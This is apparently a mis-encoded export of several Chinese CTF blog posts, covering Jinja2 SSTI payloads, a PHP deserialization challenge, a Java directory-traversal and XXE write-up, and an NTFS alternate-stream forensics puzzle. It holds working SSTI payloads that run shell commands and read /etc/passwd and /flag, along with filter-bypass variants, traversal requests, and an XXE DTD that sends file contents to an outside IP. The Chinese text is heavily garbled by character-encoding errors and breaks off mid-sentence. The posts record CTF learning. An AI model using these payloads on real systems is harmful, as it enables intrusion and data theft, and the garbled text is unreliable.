è¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±»å…ƒç»„ï¼Œæ–¹æ³•åœ¨è§£ææ—¶æŒ‰ç…§å…ƒç»„çš„é¡ºåºè§£æã€‚bases è¿”å›è¯¥å¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±»// __base__å’Œ__mro__éƒ½æ˜¯ç”¨æ¥å¯»æ‰¾åŸºç±»çš„ subclasses æ¯ä¸ªæ–°ç±»éƒ½ä¿ç•™äº†å­ç±»çš„å¼•ç”¨ï¼Œè¿™ä¸ªæ–¹æ³•è¿”å›ä¸€ä¸ªç±»ä¸­ä»ç„¶å¯ç”¨çš„çš„å¼•ç”¨çš„åˆ—è¡¨init ç±»çš„åˆå§‹åŒ–æ–¹æ³•globals å¯¹åŒ…å«å‡½æ•°å…¨å±€å˜é‡çš„å­—å…¸çš„å¼•ç”¨æˆ‘æ€è€ƒçš„ï¼š__builtins__é‡Œé¢åŒ…æ‹¬äº†ä¸€äº›ç›´æ¥æ‹¿æ¥ç”¨çš„æ–¹æ³• æ¯”å¦‚è¯´hex openç­‰ã€‚ 123456789101112131415python3:&#123;&#123;().__class__.__bases__[0].__subclasses__()[177].__init__.__globals__.__builtins__[&#x27;open&#x27;](&#x27;/flag&#x27;).read()&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;)&#125;&#125;#å‘½ä»¤æ‰§è¡Œï¼š&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;#æ–‡ä»¶æ“ä½œ&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;filename&#x27;, &#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; è¿™ç§ä¸ç”¨æ‰¾ç±»å½“ç„¶äº† ä¸‡èƒ½çš„å®é™…ç”¨èµ·æ¥å¯èƒ½å¹¶ä¸èƒ½ã€‚ã€‚å› ä¸ºä¸€èˆ¬ä¼šè¿‡æ»¤ æ¯”å¦‚è¿™é“é¢˜çš„import å’Œ popenéƒ½è¿‡æ»¤äº†ï¼ŒRCEçš„æ—¶å€™ä¸‡é‡‘æ²¹ä¸å¤ªè¡Œäº†ï¼python2:&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#x27;open&#x27;](&#x27;/etc/passwd&#x27;).read()&#125;&#125; &#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;/etc/passwd&#x27;).read()&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;)&#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465SSTIå…³é”®è¯ï¼ˆé˜²æŠ¤ç”¨ï¼‰[](\\)&#123;&#125;___.g&#39;&#39;&quot;&quot;requestgnamespace__dict____class____mro____bases____subclasses____init____globals__selfconfigurl_forget_flashed_messageslipsumcurrent_apprangesessiondictget_flashed_messagescyclerjoiner__builtins____import__evalkeysindexvaluespopenread_TemplateReference__contextenvironapplication_get_data_for_jsonJSONEncoderdefaultsystemflag*?import_IterationGuardcatch_warnings_ModuleLockflagchrsubprocesscommandssockethexbase64 æ‰¾æ¨¡å—è„šæœ¬ï¼š 123456789101112131415161718192021222324252627282930num=0import numpychoice=int(input(&quot;æ‰¾os1 å…¶ä»–0&quot;))if choice==1: for item in [].__class__.__mro__[1].__subclasses__(): try: if &#x27;os&#x27; in item.__init__.__globals__: print(num) print(item) num+=1 except: print(&#x27;-&#x27;) num+=1else: searchList = [&#x27;__init__&#x27;, &quot;__new__&quot;, &#x27;__del__&#x27;, &#x27;__repr__&#x27;, &#x27;__str__&#x27;, &#x27;__bytes__&#x27;, &#x27;__format__&#x27;, &#x27;__lt__&#x27;, &#x27;__le__&#x27;, &#x27;__eq__&#x27;, &#x27;__ne__&#x27;, &#x27;__gt__&#x27;, &#x27;__ge__&#x27;, &#x27;__hash__&#x27;, &#x27;__bool__&#x27;, &#x27;__getattr__&#x27;, &#x27;__getattribute__&#x27;, &#x27;__setattr__&#x27;, &#x27;__dir__&#x27;, &#x27;__delattr__&#x27;, &#x27;__get__&#x27;, &#x27;__set__&#x27;, &#x27;__delete__&#x27;, &#x27;__call__&#x27;, &quot;__instancecheck__&quot;, &#x27;__subclasscheck__&#x27;, &#x27;__len__&#x27;, &#x27;__length_hint__&#x27;, &#x27;__missing__&#x27;,&#x27;__getitem__&#x27;, &#x27;__setitem__&#x27;, &#x27;__iter__&#x27;,&#x27;__delitem__&#x27;, &#x27;__reversed__&#x27;, &#x27;__contains__&#x27;, &#x27;__add__&#x27;, &#x27;__sub__&#x27;,&#x27;__mul__&#x27;] neededFunction = [&#x27;open&#x27;] pay = int(input(&quot;Payload?[1|0]&quot;)) for index, i in enumerate(&#123;&#125;.__class__.__base__.__subclasses__()): for attr in searchList: if hasattr(i, attr): if eval(&#x27;str(i.&#x27;+attr+&#x27;)[1:9]&#x27;) == &#x27;function&#x27;: for goal in neededFunction: if (eval(&#x27;&quot;&#x27;+goal+&#x27;&quot; in i.&#x27;+attr+&#x27;.__globals__[&quot;__builtins__&quot;].keys()&#x27;)): if pay != 1: print(index,i.__name__,&quot;:&quot;, attr, goal) else: print(&quot;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;&quot; + i.__name__ + &quot;&#x27; %&#125;&#123;&#123; c.&quot; + attr + &quot;.__globals__[&#x27;__builtins__&#x27;].&quot; + goal + &quot;(\\&quot;[evil]\\&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&quot;)","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"},{"name":"buuoj","slug":"buuoj","permalink":"https://polosec.github.io/tags/buuoj/"}]},{"title":"ç½‘é¼æ¯web-ååºåˆ—åŒ–,java","slug":"ç½‘é¼æ¯web-ååºåˆ—åŒ–","date":"2020-05-15T15:08:19.000Z","updated":"2020-05-16T11:31:14.717Z","comments":true,"path":"2020/05/15/ç½‘é¼æ¯web-ååºåˆ—åŒ–/","link":"","permalink":"https://polosec.github.io/2020/05/15/%E7%BD%91%E9%BC%8E%E6%9D%AFweb-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"","text":"ååºåˆ—åŒ–é¢˜ç›®æºç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler &#123; protected $op; protected $filename; protected $content; function __construct() &#123; $op = &quot;1&quot;; $filename = &quot;/tmp/tmpfile&quot;; $content = &quot;Hello World!&quot;; $this-&gt;process(); &#125; public function process() &#123; if($this-&gt;op == &quot;1&quot;) &#123; $this-&gt;write(); &#125; else if($this-&gt;op == &quot;2&quot;) &#123; $res = $this-&gt;read(); $this-&gt;output($res); &#125; else &#123; $this-&gt;output(&quot;Bad Hacker!&quot;); &#125; &#125; private function write() &#123; if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123; if(strlen((string)$this-&gt;content) &gt; 100) &#123; $this-&gt;output(&quot;Too long!&quot;); die(); &#125; $res = file_put_contents($this-&gt;filename, $this-&gt;content); if($res) $this-&gt;output(&quot;Successful!&quot;); else $this-&gt;output(&quot;Failed!&quot;); &#125; else &#123; $this-&gt;output(&quot;Failed!&quot;); &#125; &#125; private function read() &#123; $res = &quot;&quot;; if(isset($this-&gt;filename)) &#123; $res = file_get_contents($this-&gt;filename); &#125; return $res; &#125; private function output($s) &#123; echo &quot;[Result]: &lt;br&gt;&quot;; echo $s; &#125; function __destruct() &#123; if($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;; $this-&gt;content = &quot;&quot;; $this-&gt;process(); &#125;&#125;function is_valid($s) &#123; for($i = 0; $i &lt; strlen($s); $i++) if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)) return false; return true;&#125;if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123; $str = (string)$_GET[&#x27;str&#x27;]; if(is_valid($str)) &#123; $obj = unserialize($str); &#125;&#125; é˜…è¯»æºç åå¯ä»¥å‘ç°ï¼Œè¿™é“é¢˜è¿‡æ»¤çš„å†…å®¹æ¯”è¾ƒå°‘ï¼Œç›¸å¯¹ç®€å•ï¼Œä½†æ˜¯æˆ‘ä¸€å¼€å§‹è¿˜æ˜¯æ²¡åšå‡ºæ¥ï¼Œèœã€‚æ–¹æ³•ä¸€ï¼šåˆ©ç”¨php7.1+ç‰¹æ€§ï¼Œå¯¹å±æ€§ç±»å‹ä¸æ•æ„Ÿï¼Œæœ¬åœ°æ„é€ çš„æ—¶å€™æŠŠprotectedæ¢æˆpublicæ„é€ å³å¯ã€‚O:11:â€FileHandlerâ€:3:{s:2:â€opâ€;i:2;s:8:â€filenameâ€;s:8:â€flag.phpâ€;s:7:â€contentâ€;s:1:â€tâ€;}å³é”®æŸ¥çœ‹æºç å³å¯ã€‚æ–¹æ³•äºŒï¼šåœ¨åˆ©ç”¨php7.1+ç‰¹æ€§çš„åŸºç¡€ä¸Šï¼Œåˆ©ç”¨phpä¼ªåè®®ï¼Œphp://filter/convert.base64-encode/resource=flag.phpè·å–flag.phpæ–‡ä»¶å†…å®¹ã€‚å¾—åˆ°å†…å®¹ä¸ºPD9waHAgJGZsYWc9J2ZsYWd7YzI0NmJmMzEtOGM3Zi00M2FhLTliY2QtMGY2NDVlNTk2NWQxfSc7Cg==ç„¶åbase64è§£ç å³å¯ã€‚&lt;?php $flag=â€™flag{c246bf31-8c7f-43aa-9bcd-0f645e5965d1}â€™; java fileè¿™é“é¢˜æ‹¿åˆ°æ‰‹æ²¡ä»€ä¹ˆæ€è·¯ï¼Œçœ‹äº†å¸ˆå‚…ä»¬çš„wpç»§ç»­åšï¼ŒçŸ¥é“äº†æ˜¯ç›®å½•ç©¿è¶Šã€‚é¦–å…ˆæ˜ç™½tomcatéƒ¨ç½²é¡¹ç›®çš„æ–‡ä»¶ç»“æ„ï¼šéƒ¨ç½²åœ¨webappsæ–‡ä»¶å¤¹ä¸‹ï¼Œå…¶ä¸‹æ¯ä¸ªæ–‡ä»¶å¤¹ä»£è¡¨ä¸€ä¸ªé¡¹ç›®ã€‚ classesæ–‡ä»¶å¤¹ä¸‹å­˜æ”¾åŸºæœ¬ç±»ï¼Œservletç­‰æ–‡ä»¶ã€‚é¦–å…ˆéšä¾¿ä¼ ä¸ªæ–‡ä»¶ï¼Œå‘ç°äº†servletçš„åå­—ã€‚é¦–å…ˆè¦è·å–web.xmlæ–‡ä»¶ï¼Œçœ‹çœ‹æ–‡ä»¶ç»“æ„æ˜¯æ€æ ·çš„ï¼Œç„¶åå†æŠŠå¯¹åº”çš„ä¸œè¥¿ä¸‹è½½ä¸‹æ¥ä½¿ç”¨../ä¸æ–­è¿”å›ä¸Šçº§ç›®å½•ï¼Œæœ€åæ˜¯/web.xmlpayload:DownloadServlet?filename=../../../web.xmlä¸‹è½½ä¸‹æ¥ä¹‹åå‘ç°äº†å‡ ä¸ªservletæ–‡ä»¶ï¼Œå¯¹åº”åº”è¯¥æ˜¯classes/xxxx.servlet.classï¼ˆæ³¨æ„å‰é¢è¿˜æœ‰åŒ…åï¼‰ä¸‹è½½servlet.classæ–‡ä»¶ï¼špayload:?filename=../../../classes/cn/abc/servlet/UploadServlet.classè¿™æ ·å­æŠŠå››ä¸ªservletä¸‹è½½ä¸‹æ¥ï¼Œç„¶ååç¼–è¯‘é˜…è¯»æºç  è¿™æ˜¯ä¸‹è½½çš„servletï¼Œæ³¨æ„çœ‹è¿‡æ»¤äº†flagï¼Œä¸èƒ½é€šè¿‡ç›®å½•ç©¿è¶Šç›´æ¥ç©¿è¶Šåˆ°æ ¹ç›®å½•ä¸‹è½½flagæ–‡ä»¶ã€‚ç»§ç»­çœ‹ä¸Šä¼ servletï¼Œå…³é”®ä»£ç ï¼š 12345678910if (filename.startsWith(&quot;excel-&quot;) &amp;&amp; &quot;xlsx&quot;.equals(fileExtName)) &#123; try &#123; Workbook wb1 = WorkbookFactory.create(in); Sheet sheet = wb1.getSheetAt(0); System.out.println(sheet.getFirstRowNum()); &#125; catch (InvalidFormatException var20) &#123; System.err.println(&quot;poi-ooxml-3.10 has something wrong&quot;); var20.printStackTrace(); &#125; &#125; è¿™é‡Œå¯èƒ½å­˜åœ¨XXEæ¼æ´ï¼Œé‚æµ‹è¯•ã€‚excelæ–‡ä»¶éœ€è¦ä»¥excel-å¼€å¤´ã€‚ç”±äºæ˜¯åœ¨buuojå¤ç°ï¼Œæ‰€ä»¥ä¸å¯ä»¥ç”¨å¤–ç½‘vpsï¼Œåªèƒ½ç”¨å†…ç½‘vpsï¼Œç”¨å¦å¤–ä¸€ä¸ªå·å†å¼€ä¸€ä¸ªsshè¿ç€ã€‚ã€‚ã€‚å¡äº†ä¿©å°æ—¶XXEæˆ‘ä¹Ÿä¸æ˜¯å¾ˆäº†è§£ï¼Œåç»­ä¼šç»§ç»­å­¦ä¹ ã€‚è¿™é‡Œè·Ÿç€å¸ˆå‚…ä»¬å…ˆå¤ç°ï¼šå¤§ä½“æ€è·¯å°±æ˜¯xmlæ–‡ä»¶åŠ è½½å¤–éƒ¨å®ä½“ï¼ŒåŠ è½½çš„å¤–éƒ¨å®ä½“é‡Œé¢ä¼šâ€åŒ…å«â€ï¼ˆæˆ‘æ˜¯è¿™ä¹ˆç†è§£çš„ï¼‰æœ¬åœ°flagæ–‡ä»¶ï¼Œç„¶åå‘vpså‘é€ä¸€ä¸ªè¯·æ±‚ï¼Œå‚æ•°æŠŠflagæ–‡ä»¶å¸¦å‡ºå»ã€‚dtdæ–‡ä»¶ï¼š 123&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#39;http:&#x2F;&#x2F;174.1.87.39:8888&#x2F;?%file;&#39;&gt;&quot;&gt;%all; xmlä¸­æ–°æ·»åŠ çš„å†…å®¹ï¼š 12&lt;!DOCTYPE data SYSTEM &quot;http:&#x2F;&#x2F;174.1.87.39&#x2F;1.dtd&quot;&gt;&lt;data&gt;&amp;send;&lt;&#x2F;data&gt; è¿™é‡Œæœ‰ä¸ªå‘ å°±æ˜¯åœ¨Windowsç³»ç»Ÿä¸‹ä¸è¦è§£å‹ï¼Œç›´æ¥ä¿®æ”¹åç¼€ç„¶åç”¨360å‹ç¼©åœ¨å‹ç¼©æ–‡ä»¶å†…ä¿®æ”¹ï¼Œå†æŠŠæ‰©å±•åæ”¹å›å»ã€‚æ”¹å¥½ä¹‹åæœåŠ¡å™¨ç›‘å¬ç«¯å£ï¼Œä¸Šä¼ æ–‡ä»¶ã€‚ ç»“æŸã€‚ æ€»ç»“XXEä¸å¤ªç†Ÿï¼Œéœ€è¦å†å­¦ä¹ ï¼Œç›®å½•ç©¿è¶Šæƒ³åˆ°äº†ï¼Œä½†æ˜¯æ²¡æˆåŠŸåˆ©ç”¨ï¼Œå†æœ‰å°±æ˜¯æˆ‘çœ‹çš„ç›®å½•ç»“æ„çœ‹çš„æ˜¯java webé¡¹ç›®çš„ç›®å½•ç»“æ„ï¼Œè€Œä¸æ˜¯tomcatéƒ¨ç½²çš„ç›®å½•ç»“æ„ï¼Œæ‰€ä»¥ä¹Ÿæ²¡åˆ©ç”¨æˆåŠŸã€‚","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"},{"name":"buuoj","slug":"buuoj","permalink":"https://polosec.github.io/tags/buuoj/"}]},{"title":"DASCTF-misc","slug":"DASCTF-misc","date":"2020-05-14T14:00:32.000Z","updated":"2020-05-14T15:15:30.786Z","comments":true,"path":"2020/05/14/DASCTF-misc/","link":"","permalink":"https://polosec.github.io/2020/05/14/DASCTF-misc/","excerpt":"","text":"DASCTF-MISC-å†…å­˜å–è¯å‚è€ƒé“¾æ¥http://www.fzwjscj.xyz/index.php/archives/25/é¦–å…ˆä½¿ç”¨volatility åˆ†ææ“ä½œç³»ç»Ÿç‰ˆæœ¬ï¼Œç„¶åè¿‡æ»¤æ–‡ä»¶ï¼Œå°†å…¶dumpå‡ºæ¥ã€‚ è¿™æ˜¯dumpå‡ºæ¥çš„å†…å®¹é€šè¿‡åˆ†æå‘ç°åœ¨ctf-wikiä¸Šæ˜¯ABCåŠ å¯†ï¼ŒQWEå¯¹åº”ç€ABCï¼Œç„¶åå¯†æ–‡æ˜¯CTKQEKNHZHQLLVGKROLATNWGQKRRKQGWNTAå°†å…¶è§£å¯†åç»“æœä¸ºveracryptpasswordiskeyboarddraobyekåŒæ—¶æç¤ºå¯†ç æ˜¯å¤§å†™çš„ï¼Œæ‰€ä»¥å¯†ç åº”è¯¥æ˜¯KEYBOARDDRAOBYEKç„¶åä½¿ç”¨veracryptåŠ è½½secretï¼Œè¾“å…¥å¯†ç ä¹‹åæœ‰ä¸ªvhdæ–‡ä»¶ï¼Œå¯ä»¥ç›´æ¥å³é”®æŒ‚è½½ã€‚ä½†æ˜¯é‡Œé¢çš„flagæ˜¯å‡çš„ã€‚ã€‚ç”¨010editorä¹Ÿæ²¡çœ‹å‡ºæ¥ä»€ä¹ˆç«¯å€ªï¼Œå‚è€ƒwpåæ‰çŸ¥é“æ˜¯NTFSéšå†™ã€‚ä½¿ç”¨ntfsstreamseditoræ‰“å¼€åå¯ä»¥çœ‹åˆ°éšå†™çš„å†…å®¹flag{4a02f6dc603c377a234df479609d237c} æ€»ç»“é¦–å…ˆæ˜¯æ²¡æ‰¾åˆ°txtæ–‡ä»¶ï¼Œå…¶æ¬¡æ˜¯ä¸çŸ¥é“åŠ å¯†æ–¹å¼ï¼Œå†åˆ°åé¢æ˜¯æ²¡æƒ³åˆ°NTFSéšå†™ã€‚ã€‚è¿™é“é¢˜ã€‚ã€‚è‡ªå·±åšæ˜¯åšä¸å‡ºæ¥ä½†æ˜¯ä¹Ÿå­¦ä¹ åˆ°äº†NTFSéšå†™è¿™ç§æ“ä½œã€‚å‚è€ƒé“¾æ¥ï¼šhttps://www.cnblogs.com/Chesky/p/ALTERNATE_DATA_STREAMS.htmlåœ¨NTFSæ–‡ä»¶ç³»ç»Ÿä¸­å­˜åœ¨ç€NTFSäº¤æ¢æ•°æ®æµï¼ˆAlternate Data Streamsï¼Œç®€ç§°ADSï¼‰ï¼Œè¿™æ˜¯NTFSç£ç›˜æ ¼å¼çš„ç‰¹æ€§ä¹‹ä¸€ã€‚æ¯ä¸€ä¸ªæ–‡ä»¶ï¼Œéƒ½æœ‰ç€ä¸»æ–‡ä»¶æµå’Œéä¸»æ–‡ä»¶æµï¼Œä¸»æ–‡ä»¶æµèƒ½å¤Ÿç›´æ¥çœ‹åˆ°ï¼›è€Œéä¸»æ–‡ä»¶æµå¯„å®¿äºä¸»æ–‡ä»¶æµä¸­ï¼Œæ— æ³•ç›´æ¥è¯»å–ï¼Œè¿™ä¸ªéä¸»æ–‡ä»¶æµå°±æ˜¯NTFSäº¤æ¢æ•°æ®æµã€‚ç®€å•åœ°è¯´å°±æ˜¯å¯ä»¥éšè—æ–‡ä»¶ï¼ˆå›¾ç‰‡è§†é¢‘å¯æ‰§è¡Œæ–‡ä»¶ï¼‰å¹¶ä¸”æ­£å¸¸æƒ…å†µä¸‹çœ‹ä¸åˆ°ã€‚å¯ä»¥ä½¿ç”¨typeå‘½ä»¤å°†éœ€è¦éšè—çš„æ–‡ä»¶é™„åŠ ä¸Šå»ã€‚å¦‚type â€œhidden.jpgâ€ &gt; â€œtarge.jpgâ€:â€hidden.jpgâ€","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"},{"name":"misc","slug":"misc","permalink":"https://polosec.github.io/tags/misc/"}]},{"title":"flask&ssti&csrf","slug":"flask-ssti-csrf","date":"2020-05-14T04:42:38.000Z","updated":"2020-05-14T14:00:00.222Z","comments":true,"path":"2020/05/14/flask-ssti-csrf/","link":"","permalink":"https://polosec.github.io/2020/05/14/flask-ssti-csrf/","excerpt":"","text":"æœ€è¿‘â€é—²çš„â€æ²¡äº‹ç ”ç©¶äº†ä¸€ä¸‹flaskæ¡†æ¶çš„é˜²æŠ¤é—®é¢˜ï¼Œä¸»è¦æ˜¯sstiä¸csrfã€‚10å·å‰ä¸€ç›´åœ¨æç”¨flaskå†™çš„bmsï¼Œç®—æ˜¯è’åºŸæ‰äº†ã€‚ã€‚å…ˆè¯´ä¸€å¥åºŸè¯ï¼Œä¸ƒç‰›CDNæœ‰ä¸ªæµ‹è¯•åŸŸåï¼Œä¸€æ®µæ—¶é—´åå¤±æ•ˆï¼Œå¤±æ•ˆåéœ€è¦æ›¿æ¢ä¸ºè‡ªå·±å¤‡æ¡ˆåçš„åŸŸåè¿›è¡ŒCDNåŠ é€Ÿï¼Œåœ¨è¿™é‡Œå‡ºç°äº†ä¸€ä¸ªé—®é¢˜ï¼Œåœ¨hexoä¸»é¢˜é…ç½®æ–‡ä»¶å°†URLæ¢ä¸ºè‡ªå·±çš„CDNåŸŸååï¼Œç”¨ä¹‹å‰çš„åŸŸåä¸Šä¼ çš„å›¾ç‰‡å°±æ‰¾ä¸åˆ°äº†ï¼ˆå› ä¸ºä¹‹å‰çš„åŸŸåå·²ç»è¢«åºŸå¼ƒï¼Œæ— æ³•è§£æï¼‰è¿™æ—¶å€™å¯ä»¥ hexo clean ç„¶å hexo gï¼Œé‡æ–°æŠŠmdæ–‡ä»¶æ¸²æŸ“æˆhtmlæ–‡ä»¶ï¼Œè¿™æ ·é‡Œé¢äº§ç”Ÿçš„å›¾ç‰‡é“¾æ¥çš„URLå‰ç¼€å°±æ˜¯æˆ‘ä»¬æ–°é…ç½®çš„CDNåŸŸåã€‚ å‚è€ƒèµ„æ–™https://mp.weixin.qq.com/s/Lj4nCz0hag-AKQF_s79fQwhttps://misakikata.github.io/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8ESSTI/#%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%A6%82%E8%BF%B0https://xz.aliyun.com/t/6885http://shaobaobaoer.cn/archives/660/python-flask-jinja-sstihttps://www.anquanke.com/post/id/188172 SSTIsstiå°±æ˜¯æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥ï¼ˆServer Side Template Injectionï¼‰æ¨¡æ¿æŒ‡çš„æ˜¯ç°æˆå†™å¥½çš„ä¸œè¥¿ï¼Œåªéœ€è¦ä¼ å…¥ä¸€äº›å˜é‡åˆ°æ¨¡æ¿ï¼Œç„¶åæ¸²æŸ“æˆhtmlé¡µé¢ã€‚æ¨¡æ¿æ˜¯å†™å¥½çš„ï¼Œè€Œå˜é‡æ˜¯æ¯æ¬¡éœ€è¦ä¼ å…¥çš„ã€‚ä¸æ­£ç¡®åœ°ä½¿ç”¨æ¨¡æ¿å¼•æ“è¿›è¡Œæ¸²æŸ“æ—¶ï¼Œä¼šå‡ºç°SSTIæ¼æ´ã€‚ï¼ˆjinja2ï¼‰åœ¨flaskä¸­ï¼Œä½¿ç”¨jinja2æ¨¡æ¿æ¸²æŸ“å¼•æ“ï¼Œæœ‰ä¸¤ç§æ¸²æŸ“æ¨¡æ¿çš„æ–¹æ³•ï¼šrender_template()å’Œrender_template_string()ï¼Œä¸¤ç§æ–¹æ³•çš„åŒºåˆ«æ˜¯ç¬¬ä¸€ç§æŒ‡å®šä¸€ä¸ªæ¨¡æ¿æ–‡ä»¶(.html)ï¼Œç¬¬äºŒç§åˆ™è§„å®šäº†éœ€è¦ä¼ å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼ŒæŠŠhtmlä»£ç å†™åˆ°å­—ç¬¦ä¸²ä¸­ã€‚å‡ºç°é—®é¢˜çš„æ˜¯ç¬¬äºŒç§æ¸²æŸ“æ–¹å¼ï¼ˆæˆ‘å†™bmsçš„æ—¶å€™ç”¨çš„æ˜¯ç¬¬ä¸€ç§ã€‚ã€‚æœ¬æ¥æƒ³å†™å†™é˜²å¾¡æ¥ç€ï¼Œä½†æ˜¯æ ¹æœ¬ä¸å­˜åœ¨åˆ©ç”¨ç‚¹ï¼‰ï¼Œå½“æ˜¾ç¤ºæ–¹å¼ä¸ºç›´æ¥è·å–å˜é‡æ—¶ï¼Œå¦‚ 12person[&#x27;name&#x27;]=request.args.get(&#x27;name&#x27;)hello ,&#123;&#123;person.name&#125;&#125; è¿™æ ·çš„è¯ä¼ å…¥ 1?name&#x3D;&#123;&#123;7*7&#125;&#125; çš„è¯æ˜¾ç¤ºçš„å°±æ˜¯7*7ï¼Œå› ä¸ºè¿™æ ·ä¼šæŠŠä¼ å…¥çš„å†…å®¹å½“ä½œå­—ç¬¦ä¸²è¿›è¡Œå¤„ç†ï¼Œè€Œéæ¨¡æ¿è¯­å¥ã€‚å¦‚æœæ˜¯è¿™æ ·ï¼š 12person[&#39;name&#39;]&#x3D;request.args.get(&#39;name&#39;)hello ,%s %person[&#39;name&#39;] é€šè¿‡å­—ç¬¦ä¸²æ ¼å¼åŒ–çš„æ–¹å¼ä¼ å…¥å†…å®¹ï¼Œæ¨¡æ¿è¯­å¥ä¼šè¢«è§£é‡Šæ‰§è¡Œã€‚ SSTIåˆ©ç”¨ä»»ä½•æ¼æ´çš„ç›®çš„æ˜¯å®ç°ä¸ªäººæ„å›¾ï¼Œæ¯”å¦‚getshellï¼Œè¯»å–æ–‡ä»¶ã€‚å¯¹äºSSTIçš„åˆ©ç”¨ï¼Œæˆ‘é‡åˆ°çš„ä¸»è¦æ˜¯é€šè¿‡è·å¾—configé‡Œé¢çš„secret keyè¿›è¡Œä¼ªé€ sessionï¼Œæ¨¡æ‹Ÿç®¡ç†å‘˜ç™»å½•ï¼›æˆ–è€…é€šè¿‡å®ä¾‹åŒ–osåå¼¹shellï¼Œæˆ–è€…é€šè¿‡fileã€openå¯¹è±¡è¿›è¡Œæ–‡ä»¶è¯»å–ã€‚__class__è·å–å½“å‰å®ä¾‹çš„å¯¹è±¡ï¼Œ__mro__è·å¾—çˆ¶ç±»é“¾ï¼Œ__subclasses__è·å¾—å½“å‰ç±»æ‰€æœ‰çš„å­ç±»ï¼Œ__init__å®ä¾‹åŒ–ä¸€ä¸ªç±»ï¼Œ__globals__è·å–æ‰€æœ‰å¯ç”¨çš„æ–¹æ³•ä¸å˜é‡ã€‚ä¸¾ä¾‹ï¼šå‘½ä»¤æ‰§è¡Œï¼š 1&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[300].__init__.__globals__[&quot;os&quot;][&quot;popen&quot;](&quot;whoami&quot;).read()&#125;&#125; è¿‡æ»¤ä¸ç»•è¿‡è¿‡æ»¤å¼•å·request.argsæ˜¯Flaskä¸­çš„ä¸€ä¸ªå±æ€§ï¼Œä¸ºè¿”å›è¯·æ±‚çš„å‚æ•°ï¼Œè¿™é‡ŒæŠŠpathå½“ä½œå˜é‡åï¼Œå°†åé¢çš„è·¯å¾„ä¼ å€¼è¿›æ¥ï¼Œè¿›è€Œç»•è¿‡äº†å¼•å·çš„è¿‡æ»¤ï¼š 1?name&#x3D;&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()&#125;&#125;&amp;path&#x3D;&#x2F;tmp&#x2F;cmd.py è¿‡æ»¤åŒä¸‹åˆ’çº¿1?name&#x3D;&#123;&#123;&#39;&#39;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read()&#125;&#125;&amp;class&#x3D;__class__&amp;mro&#x3D;__mro__&amp;subclasses&#x3D;__subclasses__ è¿‡æ»¤ä¸­æ‹¬å·é¦–å…ˆæ˜ç™½ä¸­æ‹¬å·æ˜¯ä»€ä¹ˆä½œç”¨ï¼šä»å­—å…¸ä¸­å–å€¼ã€‚ 1globals[&quot;os&quot;]&#x3D;&#x3D;globals.os æ‰€ä»¥å¯ä»¥ç”¨__getitem__ç»•è¿‡ã€‚ è¿‡æ»¤ç‚¹å·1&quot;&quot;.__class__ç­‰ä»·äº&quot;&quot;[&quot;__class__&quot;] å…³é”®è¯è¿‡æ»¤æ€è·¯æ˜¯è¿›è¡Œæ‹¼æ¥ã€‚ 1&#123;&#123;&quot;&quot;.__getattribute__(&quot;__cla&quot;+&quot;ss__&quot;)&#125;&#125; SSTIé˜²å¾¡é¦–å…ˆæ˜¯å°½é‡ä¸ä½¿ç”¨render_template_string(),å¦‚æœç”¨çš„è¯ï¼Œå°½é‡ä¸ä½¿ç”¨æ 